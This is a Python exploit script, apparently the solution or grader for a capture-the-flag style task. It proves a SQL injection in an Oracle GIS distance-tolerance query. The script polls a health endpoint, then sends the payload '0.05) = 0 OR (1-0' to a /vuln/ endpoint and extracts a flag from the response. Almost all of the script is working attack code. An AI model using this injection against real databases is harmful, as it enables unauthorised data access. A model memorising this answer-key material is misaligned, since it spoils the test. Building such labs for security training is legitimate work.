#!/usr/bin/env python3
"""Prove Oracle GIS tolerance SQL injection through the target response."""

import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def fetch(target_url: str, path: str, query: dict[str, str] | None = None) -> tuple[int, str]:
    url = f"{target_url.rstrip('/')}{path}"
    if query:
        url += "?" + urllib.parse.urlencode(query)
    try:
        response = urllib.request.urlopen(url, timeout=15)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read().decode("utf-8", errors="replace")


def wait_for_ready(target_url: str) -> None:
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        try:
            status, body = fetch(target_url, "/health/")
            if status == 200 and body == "ready":
                return
        except (OSError, TimeoutError):
            pass
        time.sleep(3)
    raise RuntimeError("Oracle GIS application did not become ready")


def exploit(target_url: str) -> str:
    wait_for_ready(target_url)
    normal_status, normal_body = fetch(target_url, "/vuln/", {"q": "0.05"})
    if normal_status != 200 or normal_body != "No matching rows":
        raise RuntimeError("normal distance query did not return zero rows")
    status, body = fetch(target_url, "/vuln/", {"q": "0.05) = 0 OR (1-0"})
    if status != 200:
        raise RuntimeError(f"injected distance query returned HTTP {status}")
    flag = body.strip()
    if not re.fullmatch(r"jaylbreak\.win\{[^}]+\}", flag):
        raise RuntimeError("injected distance query did not release a flag")
    return flag


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL")
    if not target_url:
        raise RuntimeError("REMOTE_TARGET_URL is required")
    flag = exploit(target_url)
    print(json.dumps({"evidence_payload": {"flag": flag}}))


if __name__ == "__main__":
    try:
        main()
    except (RuntimeError, OSError) as error:
        print(str(error), file=sys.stderr)
        raise SystemExit(1)
